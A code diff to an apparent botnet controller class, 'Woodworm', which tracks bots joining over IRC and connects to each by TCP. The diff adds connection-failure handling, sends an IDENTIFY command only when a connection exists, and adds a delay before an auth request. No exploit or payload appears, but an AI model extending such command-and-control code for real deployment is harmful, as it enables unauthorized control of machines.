@@ -77,16 +77,19 @@ class Woodworm:
         if self.botnetDB.get_bot(nick) is None:
             bot = context.Context(nick, ip, port)
             tcpClient = tcp_services.TCPClient(ip, port)
-            bot.set_tcp_connection(await tcpClient.connect())
-            bot.get_tcp_connection().set_download_path(self.storageDirectory)
+            connection = await tcpClient.connect()
+            if connection is not None:
+                bot.set_tcp_connection(connection)
+                bot.get_tcp_connection().set_download_path(self.storageDirectory)
+                bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
+            else:
+                self.syslog.log(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.ERROR)
+                                 
             self.botnetDB.add_bot(bot)
 
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
-
-            bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
             
-
 
     async def irc_onSomeoneLeftChannel(self, *args, **kwargs):
         nick = kwargs.get('ircNick')
@@ -212,6 +215,7 @@ class Woodworm:
         bot = self.botnetDB.get_bot(nick)
         if bot is None:
             self.syslog.log(f"Bot not found: nick: {nick}", level=logger.LogLevel.ERROR)
+            await asyncio.sleep(0.5)
             connection.send_command(f"AUTH-REQ {nick}")
             return
         
